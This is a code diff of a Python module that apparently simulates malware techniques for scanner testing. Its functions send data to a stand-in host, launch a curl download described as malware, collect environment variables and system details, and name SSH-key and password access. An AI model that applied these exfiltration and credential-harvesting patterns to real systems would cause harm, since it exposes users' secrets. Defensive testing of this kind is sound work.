@@ -1,18 +1,20 @@
 import base64
 import getpass
+import hashlib
 import http.client
 import json
 import os
 import platform
 import shutil
+import socket
 import subprocess
+import tempfile
 
 
-def send_https_post_request():
+def send_http_post_request():
     """
     Simulate exfiltration of user data via HTTPS POST request.
     """
-    fake_url = "www.package.test"
     try:
         fake_url = "www.package.test"
         connection = http.client.HTTPSConnection(fake_url, timeout=3)
@@ -26,6 +28,20 @@ def send_https_post_request():
         pass
 
 
+def simulate_http_get_request():
+    """
+    Simulate a simple HTTP GET request.
+    """
+    try:
+        fake_url = "www.package.test"
+        connection = http.client.HTTPConnection(fake_url, timeout=3)
+        connection.request("GET", "/")
+        response = connection.getresponse()
+        data = response.read()
+    except Exception as e:
+        pass
+
+
 def simulate_curl_malware_download():
     """
     Simulate loading additional malware using a curl command.
@@ -33,7 +49,7 @@ def simulate_curl_malware_download():
     try:
         fake_url = "https://wikipedia.com"
         curl_command = f"curl -s {fake_url}"
-        subprocess.run(curl_command)
+        os.popen(curl_command)
     except Exception as e:
         pass
 
@@ -115,11 +131,26 @@ def collect_system_info():
     """
     try:
         uname = platform.uname()
-        system = uname.system
         user = getpass.getuser()
         python_version = platform.python_version()
         hostname = platform.node()
+        system = platform.system()
         env_vars = dict(os.environ)
+        ip = socket.gethostname()
+    except Exception as e:
+        pass
+
+
+def simulate_write_to_temp_file():
+    """
+    Simulate writing to a temporary file.
+    """
+    try:
+        filename = os.path.join(
+            tempfile.gettempdir(),
+            hashlib.md5("simulation".encode('utf-8', errors='ignore')).hexdigest()
+        )
+        open(filename, 'w').write(b'')
     except Exception as e:
         pass
 
@@ -150,7 +181,7 @@ def simulate_obfuscated_code_binary():
 
 
 simulated_techniques = [
-    send_https_post_request,
+    send_http_post_request,
     simulate_curl_malware_download,
     access_ssh_keys,
     access_passwords,
